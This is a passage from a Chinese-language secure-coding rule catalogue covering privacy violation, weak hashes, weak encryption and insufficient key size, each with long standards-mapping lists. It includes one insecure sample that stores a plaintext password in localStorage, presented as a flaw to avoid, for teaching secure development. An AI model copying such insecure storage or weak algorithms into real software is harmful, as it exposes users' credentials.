<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.6.3 Look-up Secret Verifier Requirements, 2.7.1 Out of Band Verifier Requirements, 2.7.2 Out of Band Verifier Requirements, 2.7.3 Out of Band Verifier Requirements, 2.8.3 Single or Multi Factor One Time Verifier Requirements, 2.8.4 Single or Multi Factor One Time Verifier Requirements, 2.8.5 Single or Multi Factor One Time Verifier Requirements, 2.10.1 Service Authentication Requirements, 2.10.2 Service Authentication Requirements, 3.7.1 Defenses Against Session Management Exploits, 6.2.1 Algorithms, 6.2.3 Algorithms, 6.2.4 Algorithms, 6.2.5 Algorithms, 6.2.6 Algorithms, 9.1.2 Communications Security Requirements, 9.1.3 Communications Security Requirements, 9.2.3 Server Communications Security Requirements </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M6 Broken Cryptography </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.8, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.4 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 7 - Use of Cryptography </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3150.1 CAT II </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3150.1 CAT II </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3150.1 CAT II </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3150.1 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3150.1 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3150.1 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3150.1 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[39] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[40] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Privacy-Violation"><a href="#Privacy-Violation" class="headerlink" title="Privacy Violation"></a>Privacy Violation</h4><h5 id="ABSTRACT-70"><a href="#ABSTRACT-70" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>对机密信息（如客户密码或社会保障号码）处理不当会危及用户的个人隐私，这是一种非法行为。</p>
<h5 id="EXPLANATION-70"><a href="#EXPLANATION-70" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Privacy Violation 会在以下情况下发生：</p>
<ol>
<li><p>用户私人信息进入了程序。</p>
</li>
<li><p>数据被写到了一个外部介质，例如控制台、file system 或网络。</p>
</li>
</ol>
<p>示例：以下代码将用户的明文密码存储到本地存储。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localStorage.setItem(&apos;password&apos;, password);</span><br></pre></td></tr></table></figure>
<p>虽然许多开发人员认为本地存储是存储数据的安全位置，但这不是绝对的，特别是在涉及到隐私问题时。</p>
<p>可以通过多种方式将私人数据输入到程序中：</p>
<p>— 以密码或个人信息的形式直接从用户处获取</p>
<p>— 由应用程序访问数据库或者其他数据存储形式</p>
<p>— 间接地从合作者或者第三方处获取</p>
<p>有时，某些数据并没有贴上私人数据标签，但在特定的上下文中也有可能成为私人信息。比如，通常认为学生的学号不是私人信息，因为学号中并没有明确而公开的信息用以定位特定学生的个人信息。但是，如果学校用学生的社会保障号码生成学号，那么这时学号应被视为私人信息。</p>
<p>安全和隐私似乎一直是一对矛盾。从安全的角度看，您应该记录所有重要的操作，以便日后可以鉴定那些非法的操作。然而，当其中牵涉到私人数据时，这种做法就存在一定风险了。</p>
<p>虽然私人数据处理不当的方式多种多样，但常见风险来自于盲目信任。程序员通常会信任运行程序的操作环境，因此认为将私人信息存放在文件系统、注册表或者其他本地控制的资源中是值得信任的。尽管已经限制了某些资源的访问权限，但仍无法保证所有访问这些资源的个体都是值得信任的。例如，2004 年，一个不道德的 AOL 员工将大约 9200 万个私有客户电子邮件地址卖给了一个通过垃圾邮件进行营销的境外赌博网站 [1]。</p>
<p>鉴于此类备受瞩目的信息盗取事件，私人信息的收集与管理正日益规范化。要求各个组织应根据其经营地点、所从事的业务类型及其处理的私人数据性质，遵守下列一个或若干个联邦和州的规定：</p>
<ul>
<li><p>Safe Harbor Privacy Framework [3]</p>
</li>
<li><p>Gramm-Leach Bliley Act (GLBA) [4]</p>
</li>
<li><p>Health Insurance Portability and Accountability Act (HIPAA) [5]</p>
</li>
<li><p>California SB-1386 [6]</p>
</li>
</ul>
<p>尽管制定了这些规范，Privacy Violation 漏洞仍时有发生。</p>
<h5 id="RECOMMENDATIONS-70"><a href="#RECOMMENDATIONS-70" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>当安全和隐私的需要发生矛盾时，通常应优先考虑隐私的需要。为满足这一要求，同时又保证信息安全的需要，应在退出程序前清除所有私人信息。</p>
<p>为加强隐私信息的管理，应不断改进保护内部隐私的原则，并严格地加以执行。这一原则应具体说明应用程序应该如何处理各种私人数据。在贵组织受到联邦或者州法律的制约时，应确保您的隐私保护原则尽量与这些法律法规保持一致。即使没有针对贵组织的相应法规，您也应当保护好客户的私人信息，以免失去客户的信任。</p>
<p>保护私人数据的最好做法就是最大程度地减少私人数据的暴露。不应允许应用程序、流程处理以及员工访问任何私人数据，除非是出于职责以内的工作需要。正如最小授权原则一样，不应该授予访问者超出其需求的权限，对私人数据的访问权限应严格限制在尽可能小的范围内。</p>
<h5 id="REFERENCES-69"><a href="#REFERENCES-69" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] J. Oates AOL man pleads guilty to selling 92m email addies The Register</p>
<p>[2] Privacy Initiatives U.S. Federal Trade Commission</p>
<p>[3] Safe Harbor Privacy Framework U.S. Department of Commerce</p>
<p>[4] Financial Privacy: The Gramm-Leach Bliley Act (GLBA) Federal Trade Commission</p>
<p>[5] Health Insurance Portability and Accountability Act (HIPAA) U.S. Department of Human Services</p>
<p>[6] California SB-1386 Government of the State of California</p>
<p>[7] M. Howard, D. LeBlanc Writing Secure Code, Second Edition Microsoft Press</p>
<p>[8] Standards Mapping - Common Weakness Enumeration CWE ID 359 </p>
<p>[9] Standards Mapping - Common Weakness Enumeration Top 25 2019 [4] CWE ID 200 </p>
<p>[10] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-000169, CCI-000196, CCI-000197, CCI-001199, CCI-001312, CCI-001314 </p>
<p>[11] Standards Mapping - General Data Protection Regulation Privacy Violation </p>
<p>[12] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-4 Information Flow Enforcement (P1) </p>
<p>[13] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.2.1 General Authenticator Requirements, 2.6.3 Look-up Secret Verifier Requirements, 2.7.1 Out of Band Verifier Requirements, 2.7.2 Out of Band Verifier Requirements, 2.7.3 Out of Band Verifier Requirements, 2.8.4 Single or Multi Factor One Time Verifier Requirements, 2.8.5 Single or Multi Factor One Time Verifier Requirements, 2.10.2 Service Authentication Requirements, 2.10.3 Service Authentication Requirements, 3.7.1 Defenses Against Session Management Exploits, 6.2.1 Algorithms, 8.2.1 Client-side Data Protection, 8.2.2 Client-side Data Protection, 8.3.6 Sensitive Private Data, 8.1.1 General Data Protection, 8.1.2 General Data Protection, 8.3.4 Sensitive Private Data, 9.2.3 Server Communications Security Requirements, 10.2.1 Malicious Code Search, 14.3.3 Unintended Security Disclosure Requirements </p>
<p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[15] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling </p>
<p>[16] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[17] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.4 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.6, Requirement 8.4 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 6.5.5, Requirement 8.4 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.2.1 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.2.1 </p>
<p>[23] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.2.1 </p>
<p>[24] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 3.2, Requirement 3.4, Requirement 4.2, Requirement 8.2.1 </p>
<p>[25] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 3.3 - Sensitive Data Retention, Control Objective 6.1 - Sensitive Data Protection, Control Objective 7 - Use of Cryptography, Control Objective A.2.3 - Cardholder Data Protection </p>
<p>[26] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311 </p>
<p>[27] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311 </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3310 CAT I, APP3340 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000650 CAT II, APSC-DV-001740 CAT I, APSC-DV-001750 CAT I, APSC-DV-002330 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-000650 CAT II, APSC-DV-001740 CAT I, APSC-DV-001750 CAT I, APSC-DV-002330 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000650 CAT II, APSC-DV-001740 CAT I, APSC-DV-001750 CAT I, APSC-DV-002330 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000650 CAT II, APSC-DV-001740 CAT I, APSC-DV-001750 CAT I, APSC-DV-002330 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-000650 CAT II, APSC-DV-001740 CAT I, APSC-DV-001750 CAT I, APSC-DV-002330 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-000650 CAT II, APSC-DV-001740 CAT I, APSC-DV-001750 CAT I, APSC-DV-002330 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-000650 CAT II, APSC-DV-001740 CAT I, APSC-DV-001750 CAT I, APSC-DV-002330 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[42] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-000650 CAT II, APSC-DV-001740 CAT I, APSC-DV-001750 CAT I, APSC-DV-002330 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[43] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-000650 CAT II, APSC-DV-001740 CAT I, APSC-DV-001750 CAT I, APSC-DV-002330 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[44] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-000650 CAT II, APSC-DV-001740 CAT I, APSC-DV-001750 CAT I, APSC-DV-002330 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II </p>
<p>[45] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage </p>
<p>[46] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Weak-Cryptographic-Hash"><a href="#Weak-Cryptographic-Hash" class="headerlink" title="Weak Cryptographic Hash"></a>Weak Cryptographic Hash</h4><h5 id="ABSTRACT-71"><a href="#ABSTRACT-71" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>弱加密散列值无法保证数据完整性，且不能在安全性关键的上下文中使用。</p>
<h5 id="EXPLANATION-71"><a href="#EXPLANATION-71" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>MD2、MD4、MD5、RIPEMD-160 和 SHA-1 是常用的加密散列算法，通常用于验证消息和其他数据的完整性。然而，由于最近的密码分析研究揭示了这些算法中存在的根本缺陷，因此它们不应该再用于安全性关键的上下文中。</p>
<p>由于有效破解 MD 和 RIPEMD 散列的技术已得到广泛使用，因此不应该依赖这些算法来保证安全性。对于 SHA-1，目前的破坏技术仍需要极高的计算能力，因此比较难以实现。然而，攻击者已发现了该算法的致命弱点，破坏它的技术可能会导致更快地发起攻击。</p>
<h5 id="RECOMMENDATIONS-71"><a href="#RECOMMENDATIONS-71" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>停止使用 MD2、MD4、MD5、RIPEMD-160 和 SHA-1 对安全性关键的上下文中的数据进行验证。目前，SHA-224、SHA-256、SHA-384、SHA-512 和 SHA-3 都是不错的备选方案。但是，由于安全散列算法 (Secure Hash Algorithm) 的这些变体并没有像 SHA-1 那样得到仔细研究，因此请留意可能影响这些算法安全性的未来研究结果。</p>
<h5 id="REFERENCES-70"><a href="#REFERENCES-70" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Xiaoyun Wang MD5 and MD4 Collision Generators </p>
<p>[2] Xiaoyun Wang, Yiqun Lisa Yin, and Hongbo Yu Finding Collisions in the Full SHA-1 </p>
<p>[3] Xiaoyun Wang and Hongbo Yu How to Break MD5 and Other Hash Functions </p>
<p>[4] SDL Development Practices Microsoft</p>
<p>[5] Standards Mapping - Common Weakness Enumeration CWE ID 328 </p>
<p>[6] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002450 </p>
<p>[7] Standards Mapping - FIPS200 MP </p>
<p>[8] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-13 Cryptographic Protection (P1) </p>
<p>[10] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.4.1 Credential Storage Requirements, 2.4.2 Credential Storage Requirements, 2.4.5 Credential Storage Requirements, 2.6.3 Look-up Secret Verifier Requirements, 2.8.3 Single or Multi Factor One Time Verifier Requirements, 2.9.3 Cryptographic Software and Devices Verifier Requirements, 6.2.1 Algorithms, 6.2.2 Algorithms, 6.2.3 Algorithms, 6.2.4 Algorithms, 6.2.5 Algorithms, 6.2.6 Algorithms, 6.2.7 Algorithms, 8.3.7 Sensitive Private Data, 9.1.2 Communications Security Requirements, 9.1.3 Communications Security Requirements </p>
<p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M6 Broken Cryptography </p>
<p>[12] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[13] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[14] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[15] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[16] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.8 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.3, Requirement 6.5.8 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.3 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.3 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.3, Requirement 4.1 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.3, Requirement 4.1 </p>
<p>[23] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.3, Requirement 4.1 </p>
<p>[24] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 7.1 - Use of Cryptography, Control Objective 7.4 - Use of Cryptography </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3150.1 CAT II </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3150.1 CAT II </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3150.1 CAT II </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3150.1 CAT II </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3150.1 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3150.1 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3150.1 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002010 CAT II, APSC-DV-002020 CAT II, APSC-DV-002030 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002010 CAT II, APSC-DV-002020 CAT II, APSC-DV-002030 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002010 CAT II, APSC-DV-002020 CAT II, APSC-DV-002030 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002010 CAT II, APSC-DV-002020 CAT II, APSC-DV-002030 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002010 CAT II, APSC-DV-002020 CAT II, APSC-DV-002030 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002010 CAT II, APSC-DV-002020 CAT II, APSC-DV-002030 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002010 CAT II, APSC-DV-002020 CAT II, APSC-DV-002030 CAT II </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002010 CAT II, APSC-DV-002020 CAT II, APSC-DV-002030 CAT II </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002010 CAT II, APSC-DV-002020 CAT II, APSC-DV-002030 CAT II </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002010 CAT II, APSC-DV-002020 CAT II, APSC-DV-002030 CAT II </p>
<h4 id="Weak-Encryption"><a href="#Weak-Encryption" class="headerlink" title="Weak Encryption"></a>Weak Encryption</h4><h5 id="ABSTRACT-72"><a href="#ABSTRACT-72" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>识别调用会使用无法保证敏感数据的保密性的弱加密算法。</p>
<h5 id="EXPLANATION-72"><a href="#EXPLANATION-72" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>过时的加密算法（如 DES）无法再为敏感数据的使用提供足够的保护。加密算法依赖于密钥大小，这是确保加密强度的主要方法之一。加密强度通常以生成有效密钥所需的时间和计算能力来衡量。计算能力的提高使得在合理的时间内获得较小的加密密钥成为可能。例如，在二十世纪七十年代首次开发出 DES 算法时，要破解在该算法中使用的 56 位密钥将面临巨大的计算障碍，但今天，使用常用设备能在不到一天的时间内破解 DES。</p>
<h5 id="RECOMMENDATIONS-72"><a href="#RECOMMENDATIONS-72" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用密钥较大的强加密算法来保护敏感数据。DES 的一个强大替代方案是 AES（高级加密标准，以前称为 Rijndael）。在选择算法之前，首先要确定您的组织是否已针对特定算法和实施进行了标准化。</p>
<h5 id="REFERENCES-71"><a href="#REFERENCES-71" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Java Cryptography Architecture Standard Algorithm Name Documentation Sun Microsystems</p>
<p>[2] distributed.net DES </p>
<p>[3] FAQ About the Electronic Frontier Foundation’s “DES Cracker” Machine Electronic Frontier Foundation</p>
<p>[4] SDL Development Practices Microsoft</p>
<p>[5] Microsoft Security Fundamentals Microsoft</p>
<p>[6] John Kelsey, Bruce Schneier, and David Wagner Related-key cryptanalysis of 3-WAY, Biham-DES, CAST, DES-X, NewDES, RC2, and TEA </p>
<p>[7] Standards Mapping - Common Weakness Enumeration CWE ID 327 </p>
<p>[8] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002450 </p>
<p>[9] Standards Mapping - FIPS200 MP </p>
<p>[10] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-13 Cryptographic Protection (P1) </p>
<p>[12] Standards Mapping - OWASP Application Security Verification Standard 4.0 1.6.2 Cryptographic Architectural Requirements, 2.8.2 Single or Multi Factor One Time Verifier Requirements, 2.8.3 Single or Multi Factor One Time Verifier Requirements, 2.9.1 Cryptographic Software and Devices Verifier Requirements, 2.9.3 Cryptographic Software and Devices Verifier Requirements, 2.6.3 Look-up Secret Verifier Requirements, 2.9.3 Cryptographic Software and Devices Verifier Requirements, 6.2.2 Algorithms, 6.2.3 Algorithms, 6.2.4 Algorithms, 6.2.5 Algorithms, 6.2.6 Algorithms, 6.4.2 Secret Management, 6.2.1 Algorithms, 6.2.2 Algorithms, 8.3.7 Sensitive Private Data, 8.3.7 Sensitive Private Data, 9.1.2 Communications Security Requirements, 9.1.3 Communications Security Requirements, 9.1.2 Communications Security Requirements, 9.1.3 Communications Security Requirements </p>
<p>[13] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M6 Broken Cryptography </p>
<p>[14] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[15] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[16] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[17] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[18] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.8 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.3, Requirement 6.5.8 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.3 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.3 </p>
<p>[23] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.3 </p>
<p>[24] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.3 </p>
<p>[25] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.3 </p>
<p>[26] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 7.1 - Use of Cryptography </p>
<p>[27] Standards Mapping - SANS Top 25 2009 Porous Defenses - CWE ID 327 </p>
<p>[28] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 327 </p>
<p>[29] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 327 </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3150.1 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3150.1 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3150.1 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3150.1 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3150.1 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3150.1 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3150.1 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[42] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[43] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[44] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[45] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<p>[46] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002010 CAT II, APSC-DV-002040 CAT II </p>
<h4 id="Weak-Encryption-Insufficient-Key-Size"><a href="#Weak-Encryption-Insufficient-Key-Size" class="headerlink" title="Weak Encryption: Insufficient Key Size"></a>Weak Encryption: Insufficient Key Size</h4><h5 id="ABSTRACT-73"><a href="#ABSTRACT-73" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>另外，当使用的密钥长度不够时，强大的加密算法便容易受到强力攻击。</p>
<h5 id="EXPLANATION-73"><a href="#EXPLANATION-73" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当前的密码指南建议，RSA 算法使用的密钥长度至少应为 2048 位。但是，计算能力和因子分解技术方面的持续进步 [1] 意味着未来将不可避免地需要提高建议的密钥大小。</p>
<p>示例 1：以下代码可生成 512 位 RSA 密钥。</p>
